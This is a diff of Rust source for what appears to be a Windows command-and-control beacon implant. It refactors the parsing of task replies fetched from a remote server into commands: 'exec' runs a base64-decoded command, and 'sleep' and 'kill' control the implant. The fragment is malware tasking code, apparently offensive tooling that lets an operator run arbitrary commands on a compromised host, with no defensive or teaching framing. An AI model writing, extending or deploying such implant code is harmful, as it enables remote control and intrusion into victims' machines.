@@ -132,48 +132,50 @@ impl Beacon {
 
         let resp = self.client.request(req)?;
 
-        let colon_index = resp
-            .body
-            .iter()
-            .position(|&b| b == b':')
-            .expect("bad task response format");
+        let colon_index = resp.body.iter().position(|&b| b == b':');
 
-        let (task_name_bytes, payload_bytes) = resp.body.split_at(colon_index);
+        // catch plain no-payload commands and payload commands
+        let (task, payload) = match colon_index {
+            Some(index) => {
+                let (task_name_bytes, payload_bytes) = resp.body.split_at(index);
 
-        // skip the colon
-        let payload_bytes = &payload_bytes[1..];
+                // skip the colon
+                let payload_bytes = &payload_bytes[1..];
 
-        let task_name = String::from_utf8_lossy(task_name_bytes)
-            .trim()
-            .to_lowercase();
-        let payload_str = String::from_utf8_lossy(payload_bytes);
+                let task_name = String::from_utf8_lossy(task_name_bytes)
+                    .trim()
+                    .to_lowercase();
+                let payload_str = String::from_utf8_lossy(payload_bytes).to_string();
+
+                (task_name, Some(payload_str))
+            }
+            None => (String::from_utf8(resp.body)?.trim().to_lowercase(), None),
+        };
 
         // decode base64 payload if present
-        let task = match task_name.as_str() {
+        match task.as_str() {
             // exec:[base64 encoded command]
             "exec" => {
                 let decoded = BASE64_STANDARD
-                    .decode(payload_str.as_bytes())
+                    .decode(payload.unwrap().as_bytes())
                     .map_err(|_| windows::core::Error::from_win32())?;
-                Task::Exec(decoded)
+                Ok(Task::Exec(decoded))
             }
             // sleep:[duration in seconds]
             "sleep" => {
-                let seconds: u64 = payload_str
+                let seconds: u64 = payload
+                    .unwrap()
                     .parse()
                     .map_err(|_| windows::core::Error::from_win32())?;
-                Task::Sleep(Duration::from_secs(seconds))
+                Ok(Task::Sleep(Duration::from_secs(seconds)))
             }
-            // kill:[idk yet]
-            // payload shouldn't even exist for kill but whatever i'll deal with it later
-            "kill" => Task::Kill,
+            // kill
+            "kill" => Ok(Task::Kill),
             other => {
                 debug!("unknown task: {}", other);
                 return Err(windows::core::Error::from_win32());
             }
-        };
-
-        Ok(task)
+        }
     }
 
     /// /api/v1/result POST
